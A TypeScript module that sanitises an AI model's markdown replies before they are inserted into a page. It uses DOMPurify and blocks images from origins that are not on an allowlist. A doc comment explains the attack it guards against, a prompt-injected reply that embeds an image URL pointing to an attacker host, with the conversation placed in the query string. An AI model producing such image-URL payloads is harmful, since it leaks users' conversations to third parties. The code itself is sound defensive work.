import DOMPurify from 'dompurify';
import { marked } from 'marked';

// Links in replies open in a new tab and cannot reach back into the host page.
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

/** Decides whether an image URL may be loaded; see imageGate(). */
export type ImageGate = (src: string) => boolean;

/**
 * Images may load from the host page's own origin and the listed ones only.
 * Anything else is how a prompt-injected reply would leak data: the browser
 * fetches `https://attacker/?q=<conversation>` the moment the image renders.
 */
export function imageGate(allowedOrigins: readonly string[], base: string = document.baseURI): ImageGate {
  const allowed = new Set(allowedOrigins.map((o) => o.replace(/\/+$/, '').toLowerCase()));
  allowed.add(new URL(base).origin.toLowerCase());
  return (src: string) => {
    try {
      const url = new URL(src, base);
      return (url.protocol === 'https:' || url.protocol === 'http:') && allowed.has(url.origin.toLowerCase());
    } catch {
      return false;
    }
  };
}

/**
 * Renders an assistant reply (markdown) to HTML that is safe to insert.
 *
 * The text comes from a language model, so it is untrusted: DOMPurify strips
 * scripts, event handlers and javascript: URLs, and images outside `gate` become
 * plain links. Never skip the sanitize step - unlike the old Angular widget,
 * nothing else in this component does it.
 */
export function renderMarkdown(text: string, gate: ImageGate = () => false): string {
  if (!text) {
    return '';
  }
  const html = marked.parse(text, { gfm: true, breaks: true, async: false }) as string;
  const clean = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });

  const template = document.createElement('template');
  template.innerHTML = clean;
  template.content.querySelectorAll('img').forEach((img) => {
    const src = img.getAttribute('src') || '';
    if (gate(src)) {
      img.setAttribute('loading', 'lazy');
      img.setAttribute('referrerpolicy', 'no-referrer');
      return;
    }
    // Not loaded, but not hidden either: the person can still choose to open it.
    const link = document.createElement('a');
    link.textContent = img.getAttribute('alt') || src;
    if (/^https?:/i.test(src)) {
      link.href = src;
      link.target = '_blank';
      link.rel = 'noopener noreferrer';
    }
    img.replaceWith(link);
  });
  return template.innerHTML;
}
